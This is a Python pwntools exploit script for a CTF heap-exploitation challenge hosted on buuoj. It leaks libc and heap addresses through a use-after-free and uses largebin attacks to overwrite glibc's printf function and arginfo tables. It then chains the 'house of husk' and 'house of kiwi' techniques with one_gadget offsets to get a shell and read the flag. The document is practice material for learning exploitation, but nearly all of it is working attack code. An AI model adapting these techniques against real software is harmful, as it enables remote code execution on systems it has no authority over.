#!/usr/bin/env python3
#coding:utf-8

from pwn import *

#--------------------prepare------------------------
binary = './gifts_fixed'
libc_so = ""
host = "node4.buuoj.cn"
port = 10001
#---------------------------------------------------
elf = ELF(binary)
libc = ELF(libc_so) if libc_so else elf.libc
context(arch = elf.arch, os = 'linux')
if args.G:
    context.log_level = 'debug'
p = remote(host, port) if args.R else process(binary)

def attach():
    context(log_level = 'debug', terminal=["tmux","splitw","-v"])
    gdb.attach(p)
    dbg()
def ROL(data, key):
    tmp = bin(data)[2:].rjust(64, '0')
    return int(tmp[key:]+tmp[:key], 2)
#---------------------short command-------------------
dbg = lambda msg='debug': info(f'[*]{msg}') if args.R else input(f"pid: {pidof(p)[0]} =>{msg}")
checkstr = lambda data:data if isinstance(data, bytes) else data.encode()
sl = lambda data: p.sendline(checkstr(data))
sd = lambda data: p.send(checkstr(data))
sa = lambda delimit, data: p.sendafter(checkstr(delimit), checkstr(data))
sla = lambda delimit, data: p.sendlineafter(checkstr(delimit), checkstr(data))
ru = lambda delimit: p.recvuntil(checkstr(delimit))
rl = lambda : p.recvline()
rcn = lambda number=4096: p.recv(number)
ss = lambda delimit, data: success(f'{delimit}: {data:#x}')
uu64 = lambda data:u64(checkstr(data).ljust(8, p8(0)))
uu32 = lambda data:u32(checkstr(data).ljust(4, p8(0)))
str_bin_sh = next(libc.search(b'/bin/sh\x00'))
get_flag = lambda : sl(f"cat {'flag' if args.R else '/tmp/flag'}")

#---------------------PWN SPACE----------------------
def menu(c):
    sla('>> ', str(c))
def add(size):
    menu(1)
    if size>0x70 and size<0x14f:
        t = 1
    elif size>=0x14f and size<0x24f:
        t = 2
    else:
        t = 3
    sla('3. Gf3~', str(t))
    chunk_type = {
        1: 'input size of Gf1:',    #0x7f-0x14f
        2: 'input size of Gf2:',    #0x14f-0x24f
        3:'input size of Gf3:'  #0x24f-0x4ff
    }
    sla(chunk_type[t], str(size))

def delete(index):
    menu(2)
    sla('gift you want to give to someone:', str(index))
    ru('send success!')

def show(index):
    menu(3)
    sla('input the idx of gift:', str(index))

def edit(index, content, t = 1):
    menu(4)
    sla('input the idx of gift:', str(index))
    chunk_type = {
        1:'leave your blessing of Gf1:\n',
        2:'leave your blessing of Gf2:\n',
        3:'leave your blessing of Gf3:\n',
    }
    sa(chunk_type[t], content)

add(0x410) #0
add(0x410) #1
add(0x420) #2
add(0x410) #3

#--------------------leak libc heap-------------------------
delete(2)
show(2)
main_offset = 96 + 0x10 + libc.sym.__malloc_hook
main_arena  = uu64(ru(p8(0x7f))[-6:])
libc_base = main_arena - main_offset

add(0x430) #4
edit(2, 'a'*0x11, 3)
show(2)
ru('a'*0x10)
chunk2_addr = uu64(rcn(6)) - 0x61
heapbase = chunk2_addr - 0x12700
ss('heapbase', heapbase)
ss('chunk2', chunk2_addr)

#gadgets = 
system_addr = libc_base + libc.sym.system
printf_arginfo_table = libc_base + 0x1ed7b0
printf_function_table =libc_base + 0x1f1318

ss('printf_arginfo_table', printf_arginfo_table)
ss('printf_function_table',printf_function_table)

#chunks 
chunk0 = 0x11ec0 + heapbase
chunk1 = 0x122e0 + heapbase
chunk2 = 0x12700 + heapbase
chunk3 = 0x12f50 + heapbase

#------------------largebin attack-------------
delete(0)
payload = flat([
    main_arena,
    main_arena,
    chunk2,
    printf_function_table - 0x20 #0x55b2de420700 chunk2
])
edit(2, payload, 3)
add(0x450) #5

add(0x410) #6
delete(6)
payload = flat([
    main_arena,
    main_arena,
    chunk2,
    printf_arginfo_table - 0x20 #0x55b2de41fec0 chunk0
])

edit(2, payload, 3)
add(0x450) #7

#one_gadget /libs/2.31-0ubuntu9.7_amd64/libc-2.31.so -l 3 |grep "^0x"|awk -F " " 'BEGIN{print "["};{print "libc_base+"$1","};END{print"]"}'
one_gadget = [
libc_base+0x51e39,
libc_base+0x51e45,
libc_base+0x51e5a,
libc_base+0x51e62,
libc_base+0x84173,
libc_base+0x84180,
libc_base+0x8418c,
libc_base+0x84199,
libc_base+0xe3b2e,
libc_base+0xe3b31,
libc_base+0xe3b34,
libc_base+0xe3d23,
libc_base+0xe3d26,
libc_base+0xe3d99,
libc_base+0xe3da0,
libc_base+0xe3de5,
libc_base+0xe3ded,
libc_base+0x1075da,
libc_base+0x1075e2,
libc_base+0x1075e7,
libc_base+0x1075f1]
#--------------------house of husk--------------

payload = flat({(920-0x10): one_gadget[8]}) #尝试到第8个才成功，
#这里为什么是920呢，因为格式化字符串为%s
#ord(s)=115, 115*8=920, 
#large bin attack攻击后地址指向堆头，而我们编辑是数据区，所以要920-0x10才是__printf_arginfo_table['s']

edit(0,payload, 3)
#--------------------house of kiwi--------------

add(0x450) #8
delete(8)
add(0x440) #9
edit(8, flat({0x448:0x300}), 3) #modify top chunk size to 0x300

add(0x4a0) #malloc(0x4a0)-->__malloc_assert-->vxfprintf("%s"...)

#--------INTERACTIVE----------------------------
#get_flag()
p.interactive()